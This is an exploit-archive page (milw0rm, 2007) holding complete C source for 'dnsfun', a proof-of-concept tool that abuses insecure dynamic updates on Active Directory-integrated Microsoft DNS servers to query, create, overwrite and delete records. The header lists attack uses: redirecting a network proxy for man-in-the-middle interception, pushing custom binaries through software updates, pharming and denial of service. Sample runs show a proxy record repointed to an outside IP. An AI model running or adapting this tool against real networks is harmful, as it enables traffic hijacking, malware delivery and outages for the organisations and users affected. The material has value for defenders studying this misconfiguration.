<html><head><title>Microsoft DNS Server (Dynamic DNS Updates) Remote Exploit</title></head><pre>/*
Exploiting Microsoft DNS Dynamic Updates for Fun and profit
Andres Tarasco Acuña  - (c) 2007 
Url: http://www.514.es
  

By default, most Microsoft DNS servers integrated with active directory allow
insecure dynamic updates for dns records.
This feature allows remote users to create, change and delete DNS records.
There are several attack scenarios:

+ MITM attacks: Changing dns records for the network proxy and relay HTTP queries. 
  This attack vector is the most reliable and also allows us to exploit automatic 
  updates for most Windows software, by deploying custom binaries to the client.

 + Denial of service: by deleting / changing critical dns records

 + Pharming: like mitm attacks, poisoning several dns records.

dnsfun exploits that weak configuration and allows remote users to modify dns records.
Here are some examples of what can be done. Example:


D:\DNSfun&gt;ping -n 1 FakeProxy.fooooo.com
Haciendo ping a FakeProxy.fooooo.com [66.6.66.6] con 32 bytes de datos:
      
D:\DNSfun&gt;dnsfun.exe -s 10.100.1.1 -q  proxy.mydomain -u 66.6.66.6
Microsoft Dynamic DNS Updates - Proof of Concept
http://www.514.es - (c) 2007 Andres Tarasco Acuña
      
 [+] Trying to resolve Host: proxy.mydomain (Dns Server 10.100.1.1)
 [+] Host proxy.mydomain resolved as 192.168.1.200
 [+] Trying to set ip address of the host proxy.mydomain to 66.6.66.6
 [+] Trying Nonsecure Dynamic Update...
 [?] Host Updated. Checking...(0)
 [+] Host proxy.mydomain resolved as 66.6.66.6

D:\DNSfun&gt;dnsfun.exe -s 10.100.1.1 -cc atarasco.mydomain.com -u www.514.es
 Microsoft Dynamic DNS Updates - Proof of Concept
 http://www.514.es - (c) 2007 Andres Tarasco Acuña

[+] Gathering Credentials..
[+] Creating DNS CName Record for atarasco.mydomain.com (www.514.es)
[+] Host Created. Rechecking Record...
[+] Host atarasco.mydomain.com resolved as CNAME www.514.es

This isn't a new vulnerability but AFAIK those attack vectors were never exploited.

Check the usage function for more information

*/
#include &lt;stdio.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;Windns.h&gt;
#pragma comment(lib,&quot;Dnsapi.lib&quot;)
#pragma comment(lib, &quot;ws2_32.lib&quot;)

char TargetDnsServer[256]=&quot;&quot;; // -s
char TargetDnsRecord[256]=&quot;&quot;; // -q
char NewIpAddress[256]=&quot;&quot;;    // -i 
char DeleteDnsRecord[256]=&quot;&quot;; //-d 
char CreateDnsRecord[256]=&quot;&quot;;

WORD CreationType=DNS_TYPE_A;

#define DELETERECORD   (DeleteDnsRecord[0]!='\0')
#define UPDATERECORD ( (TargetDnsRecord[0]!='\0') &amp;&amp; (NewIpAddress[0]!='\0') )
#define CREATERECORD ( (CreateDnsRecord[0]!='\0') &amp;&amp; (NewIpAddress[0]!='\0') )
#define QUERYRECORD    (TargetDnsRecord[0]!='\0')
#define _DBG_
#undef _DBG_

void usage(char *argv[]);


DNS_RECORDA *DnsQueryA(char *name,IP4_ARRAY *servers) 
{
   
   DNS_STATUS status;
   WORD type= DNS_TYPE_ANY;
   DWORD fOptions=DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_LOCAL_NAME |DNS_QUERY_NO_HOSTS_FILE | DNS_QUERY_NO_NETBT | DNS_QUERY_TREAT_AS_FQDN;
   PVOID* reserved=NULL;
   DNS_RECORDA *records=(PDNS_RECORDA)malloc(sizeof(DNS_RECORDA));
   DNS_RECORDA *result;
   IN_ADDR ipaddr;
   int i;
   int count=0;        
   
   if (!name) {
      return (NULL);
   } else {
      memset(records,'\0',sizeof(DNS_RECORDA));
      status = DnsQuery_A( name,          //PCWSTR pszName,
         type,          //WORD wType,
         fOptions,      //DWORD fOptions,
         servers,       //PIP4_ARRAY aipServers,
         (DNS_RECORDA**)&amp;records,    //PDNS_RECORD* ppQueryResultsSet,
         reserved ); //PVOID* pReserved
      
      if (status == ERROR_SUCCESS)
      {
         fflush(stdout);
         result=records;
         do {
#ifdef _DBG_    
            printf(&quot;[+] Record %i---\n&quot;,count);
            count++;
            printf(&quot;[+] DNS  wDataLength %i\n&quot;,result-&gt;wDataLength);
            printf(&quot;[+] DNS Flags DW: %x\n&quot;,result-&gt;Flags.DW);
            printf(&quot;[+] DNS Flags S.Section: %x\n&quot;,result-&gt;Flags.S.Section);
            printf(&quot;[+] DNS Flags S.Delete: %x\n&quot;,result-&gt;Flags.S.Delete);
            printf(&quot;[+] DNS Flags S.CharSet: %x\n&quot;,result-&gt;Flags.S.CharSet);
            printf(&quot;[+] DNS Flags S.Unused: %x\n&quot;,result-&gt;Flags.S.Unused);
            printf(&quot;[+] DNS Flags S.Reserved: %x\n&quot;,result-&gt;Flags.S.Reserved);
#endif
            switch (result-&gt;wType) {
            case DNS_TYPE_A:
               ipaddr.S_un.S_addr = (result-&gt;Data.A.IpAddress);
               printf(&quot;[+] Host %s resolved as %s\n&quot;, result-&gt;pName,inet_ntoa(ipaddr));
               break;
            case DNS_TYPE_NS:
               printf(&quot;[+] Domain %s Dns Servers: %s\n&quot;,result-&gt;pName,result-&gt;Data.Ns.pNameHost);
               break;
            case DNS_TYPE_CNAME:
               printf(&quot;[+] Host %s resolved as CNAME %s\n&quot;, result-&gt;pName,result-&gt;Data.Cname.pNameHost);
               //DnsQueryA(result-&gt;Data.Cname.pNameHost,servers);
               break;
               
            case DNS_TYPE_SOA:
               printf(&quot;[+] SOA Information: PrimaryServer: %s\n&quot;,result-&gt;Data.Soa.pNamePrimaryServer);
               printf(&quot;[+] SOA Information: Administrator: %s\n&quot;,result-&gt;Data.Soa.pNameAdministrator);
               printf(&quot;[+] SOA Information: SerialNo %x - Refresh %i - retry %i - Expire %i - DefaultTld %i\n&quot;,
                  result-&gt;Data.Soa.dwSerialNo,
                  result-&gt;Data.Soa.dwRefresh,
                  result-&gt;Data.Soa.dwRetry,
                  result-&gt;Data.Soa.dwExpire,
                  result-&gt;Data.Soa.dwDefaultTtl);
               break;
               
            case DNS_TYPE_MX:
               printf(&quot;[+] %s MX Server resolved as %s (Preference %i)\n&quot;, result-&gt;pName,result-&gt;Data.Mx.pNameExchange, result-&gt;Data.Mx.wPreference);
               break;

            case DNS_TYPE_TEXT:
               printf(&quot;[+] Text: %i bytes\n&quot;,result-&gt;Data.Txt.dwStringCount); //:?
               break;

            case DNS_TYPE_SRV:
               printf(&quot;[+] SRV Record. NameTarget %s &quot;,result-&gt;Data.Srv.pNameTarget);
               printf(&quot;(Priority %i - Port %i - Weigth: %i)\n&quot;,result-&gt;Data.Srv.wPriority,result-&gt;Data.Srv.wPort,result-&gt;Data.Srv.wWeight);
               //printf(&quot;[+] Resource Pad %i \n&quot;,result-&gt;Data.Srv.Pad);
               break;
               
            default:
               printf(&quot;[-] DnsQuery returned unknown wtype %x\n&quot;,result-&gt;wType);
               break;
            }
            result=result-&gt;pNext;
         } while (result!=NULL);
      } else {
         if (status==9003) printf(&quot;[-] Record not found\n&quot;);
         else printf(&quot;[-] Query Error: %i - %i\n&quot;,status,GetLastError());
         exit(-1);
      }
   }
   return records;
}
/***********************************************************************************************/
int main(int argc, char *argv[]) {
   
   HANDLE creds;
   DNS_RECORDA *result;
   DNS_STATUS status;
   
   HANDLE ContextHandle;
   DWORD Options=DNS_UPDATE_SECURITY_ON;
   PVOID pReserved=NULL;
   IN_ADDR ipaddr;
   IP4_ARRAY *servers=NULL;
   SEC_WINNT_AUTH_IDENTITY_A *Credentials=NULL;
   WORD i;
      
   printf(&quot; Microsoft Dynamic DNS Updates - Proof of Concept\n&quot;);
   printf(&quot; http://www.514.es - (c) 2007 Andres Tarasco Acuña\n\n&quot;);
   if (argc==1) usage(argv);
      
   //Init Credentials Struct
   Credentials = (SEC_WINNT_AUTH_IDENTITY_A *)malloc(sizeof(SEC_WINNT_AUTH_IDENTITY_A));
   memset(Credentials,'\0',sizeof(SEC_WINNT_AUTH_IDENTITY_A));
   Credentials-&gt;Flags=SEC_WINNT_AUTH_IDENTITY_ANSI;   
   for(i=1;i&lt;argc;i++) {
      if ( (argv[i][0]=='-') ) {
         switch (argv[i][1]) {
         case 's':
         case 'S':
            strcpy(TargetDnsServer,argv[i+1]);
            servers=(PIP4_ARRAY)malloc(sizeof(IP4_ARRAY));
            servers-&gt;AddrCount=1;
            servers-&gt;AddrArray[0]=inet_addr(TargetDnsServer);
            break;
         case 'D':
         case 'd':
            strcpy(DeleteDnsRecord,argv[i+1]);
            break;                    
         case 'q':
         case 'Q':
            strcpy(TargetDnsRecord,argv[i+1]);
            break;
         case 'u':
         case 'U':
            strcpy(NewIpAddress,argv[i+1]);
            break;
         case 'c':
         case 'C':
            strcpy(CreateDnsRecord,argv[i+1]);
            if (NewIpAddress[0]=='\0') strcpy(NewIpAddress,&quot;127.0.0.1&quot;);
            if (argv[i][2]!='\0') {
               switch (argv[i][2]) {
               case 'c': CreationType=DNS_TYPE_CNAME;
                  break;
               case 'a': CreationType=DNS_TYPE_A;
                  break;
               }
            }
            break;           
            /*
            case 'f':
               CreateThread( NULL,0,HttpRelayToProxy,(LPVOID) &amp;i,0,&amp;dwThreadId);
               break;
            case 'au': //Uauthorization serName
            Credentials-&gt;User=argv[i+1]; Credentials-&gt;UserLength=strlen(argv[i+1]);   break;
            case 'ap':
            Credentials-&gt;Password=argv[i+1];Credentials-&gt;PasswordLength=strlen(argv[i+1]); break;
            case 'ad':
            Credentials-&gt;Domain=argv[i+1]; Credentials-&gt;DomainLength=strlen(argv[i+1]);  break;     
            */
         default:
            printf(&quot;[-] Invalid argument: %s\n&quot;,argv[i]);
            usage(argv);
            break;
         }
         i++;            
      } else usage(argv);
   }
   
   printf(&quot;[+] Gathering Credentials..\n&quot;);
   //http://msdn2.microsoft.com/en-us/library/ms682007.aspx
   if (Credentials-&gt;UserLength==0) {
      status=DnsAcquireContextHandle(FALSE,NULL,&amp;ContextHandle); //Context with default Credentials
   } else {
      status=DnsAcquireContextHandle(FALSE,Credentials,&amp;ContextHandle); //Context with Custom Credentials
   }
   
   if (status == ERROR_SUCCESS) {          
      if (CREATERECORD) {
         
         result=(PDNS_RECORDA)malloc(sizeof(DNS_RECORDA));
         memset(result,'\0',sizeof(DNS_RECORDA));
         result-&gt;wType=CreationType; //DNS_TYPE_A by default
         if (CreationType==DNS_TYPE_CNAME) {
            printf(&quot;[+] Creating DNS CName Record for %s (%s)\n&quot;,CreateDnsRecord,NewIpAddress);
            result-&gt;Data.Cname.pNameHost=NewIpAddress;
         } else {
            printf(&quot;[+] Creating DNS A Record for %s (%s)\n&quot;,CreateDnsRecord,NewIpAddress);
            result-&gt;Data.A.IpAddress=inet_addr(NewIpAddress);
         } 
         result-&gt;pName=CreateDnsRecord;
         result-&gt;wDataLength=4;
         result-&gt;Flags.S.Section=1;
         result-&gt;Flags.S.CharSet=DnsCharSetAnsi;
         result-&gt;pNext=NULL;       

         status=DnsModifyRecordsInSet_A(result,  //add record
            NULL, //delete record
            Options,
            ContextHandle,
            servers,
            NULL);
         if (status ==ERROR_SUCCESS) {
            printf(&quot;[+] Host Created. Rechecking Record...\n&quot;);
            DnsRecordListFree(result,DnsFreeRecordList);
            result=DnsQueryA(CreateDnsRecord,servers);
         } else {
            printf(&quot;[-] Error: Unable to create  %s (%i)\n&quot;,CreateDnsRecord,status);
         }      
      } else if (DELETERECORD) {         
         printf(&quot;[+] Trying to resolve Host: %s before deleting\n&quot;,DeleteDnsRecord);
         result=DnsQueryA(DeleteDnsRecord,servers);
         if (result!=NULL) {
            printf(&quot;[+] Trying to Delete Record. Are You Sure? (Y/N)...&quot;);
            i=getchar(); if (i!='y') return(-1);
            printf(&quot;[+] Deleting record %s\n&quot;,DeleteDnsRecord);   
            status=DnsModifyRecordsInSet_A(NULL,  //add record
               result, //delete record
               Options,
               ContextHandle,
               servers,
               NULL);      
            if (status ==ERROR_SUCCESS) {
               printf(&quot;[+] Host Deleted. Rechecking Record %s...\n&quot;,DeleteDnsRecord);
               DnsRecordListFree(result,DnsFreeRecordList);
               result=DnsQueryA(DeleteDnsRecord,servers);
            } else {
               printf(&quot;[-] Error: Unable to Delete %s\n&quot;,DeleteDnsRecord);
            }
         } else {
            printf(&quot;[-] Host %s not found\n&quot;,DeleteDnsRecord);
         }

      } else if (UPDATERECORD) {
         //         exit(1);
         printf(&quot;[+] Trying to resolve Host: %s before updating\n&quot;,TargetDnsRecord);
         result=DnsQueryA(TargetDnsRecord,servers);
         if (result-&gt;wType==DNS_TYPE_A ) {
            printf(&quot;[+] Trying to update record. Are You Sure? (Y/N)...&quot;);
            i=getchar(); if (i!='y') return(-1);
            result-&gt;Data.A.IpAddress=inet_addr(NewIpAddress);//Modify Dns record
            ipaddr.S_un.S_addr = (result-&gt;Data.A.IpAddress);
            printf(&quot;[+] Trying to set ip address of the host %s to %s \n&quot;, TargetDnsRecord,NewIpAddress);//inet_ntoa(ipaddr));
            printf(&quot;[+] Trying to Modify Record...\n&quot;);
            status=DnsReplaceRecordSetA(result,
               Options, //Attempts nonsecure dynamic update. If refused, then attempts secure dynamic update.
               ContextHandle,
               servers,//pServerList,
               NULL);//pReserved
            if (status ==ERROR_SUCCESS) {
               printf(&quot;[+] Host Updated. Rechecking Record...\n&quot;);
               DnsRecordListFree(result,DnsFreeRecordList);
               result=DnsQueryA(TargetDnsRecord,servers);
            } else {
               printf(&quot;[-] Error: Unable to Delete %s\n&quot;,TargetDnsRecord);
            }

         } else {
            printf(&quot;[-] Unable to Update Record (Type %x)\n&quot;,result-&gt;wType);
            }
      } else if (QUERYRECORD) {
         printf(&quot;[+] Query Information for host %s...\n&quot;,TargetDnsRecord);
         result=DnsQueryA(TargetDnsRecord,servers);
         DnsRecordListFree(result,DnsFreeRecordList);         
      } else {
         printf(&quot;[-] Unknown Options\n&quot;);
         return(-1);
      }           
   } else {
      printf(&quot;[-] Error Calling DnsAcquireContextHandle\n&quot;);   
   }
   return (1);
}

/****************************************************************************/
void usage(char *argv[]) {  
   printf(&quot; Usage:\n&quot;);
   printf(&quot;\t%s\t -[s]d|c|q[u] &lt;options&gt;\n&quot;,argv[0]);
   printf(&quot; Details:\n&quot;);   
   printf(&quot;\t%s\t -s  ip        (dns Server (optional))\n&quot;,argv[0]);
   printf(&quot;\t%s\t -d  fqdn      (Delete dns record)\n&quot;,argv[0]);
   printf(&quot;\t%s\t -q  fqdn      (Query  dns record)\n&quot;,argv[0]);
   printf(&quot;\t%s\t -c[a|c] ip    (Create A or CName record (default A))\n&quot;,argv[0]);
   printf(&quot;\t%s\t -u  ip|fqdn   (Update dns record (requires -q or -c))\n&quot;,argv[0]);     
   printf(&quot;\n Examples:\n&quot;);
   printf(&quot;\t%s -s 10.0.0.1 -q proxy.mydomain.com -u 5.1.4.77 (Updates record)\n&quot;,argv[0]);
   printf(&quot;\t%s -s 10.0.0.1 -d foo.mydomain.com      (delete foo.mydomain.com record)\n&quot;,argv[0]);
   printf(&quot;\t%s -s 10.0.0.1 -c atarasco.foo.mydomain.com -u 5.14.7.7 (creates record)\n&quot;,argv[0]);
   printf(&quot;\t%s -s 10.0.0.1 -cc www.atarasco.foo.mydomain.com -u 5.14.7.7 (creates record)\n&quot;,argv[0]);
   printf(&quot;\t%s -s 10.0.0.1 -q _ldap._tcp.mydomain             (Query for srv record)\n&quot;,argv[0]);
   exit(0);
}
/****************************************************************************/

// milw0rm.com [2007-03-22]</pre></html>